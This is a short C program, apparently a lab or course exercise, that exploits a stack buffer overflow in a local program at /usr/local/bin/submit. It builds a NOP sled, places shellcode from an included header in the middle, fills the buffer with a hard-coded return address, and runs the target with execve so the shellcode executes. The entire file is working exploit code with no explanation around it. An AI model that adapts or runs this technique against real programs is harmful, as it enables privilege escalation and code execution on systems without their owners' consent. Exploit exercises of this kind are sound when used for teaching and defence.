#include <stdio.h>
#include <unistd.h>
#include </usr/local/src/shellcode.h>

#define SIZE (521)
#define NOP (0x90)

int main(int argc, char **argv) {
	char buf[SIZE], *it, *args[2];
	int i, k;
	const int slen = strlen(shellcode);
	const int half = SIZE / 2;
	long *addr_ptr, addr;
	// FILE *file;

	// The address of the target buffer 
	addr = 0xffbfdb10;
	// Fill the buf with the address of the target buffer 
	addr_ptr = (long*) buf;
	for (i = 0; i < SIZE; i+=4) {
		*(addr_ptr++) = addr;
	}
	
	// Padding NOP's to the first-half of the buf
	
	for(i = 0; i < half; i++){
		buf[i] = NOP;
	}

	//Put the shell code into the buf
	it = buf + (half - slen/2);
	memcpy(it, shellcode, slen);
	
	for(k = 0; k < SIZE; k++){
		if(k == SIZE-1){
			buf[k] = '\0';
			break;
		}
		buf[k] = buf[k+1];
	}

	
	// put the buf into a file called "out"
	// if ((file = fopen("pass", "w+")) == NULL) {
	// 	puts("Cannot open 'pass' for writing the buf");
	// 	return -1;
	// }

	// fprintf(file, "%s\n", buf);
	// fclose(file);

	
	// set up arguments and then run the exploit
	args[0] = buf;
	args[1] = NULL;

	//en[0] = NULL;


	if(execve("/usr/local/bin/submit", args, NULL) < 0){
		printf("execve fail\n");
	}
	return 0;
}
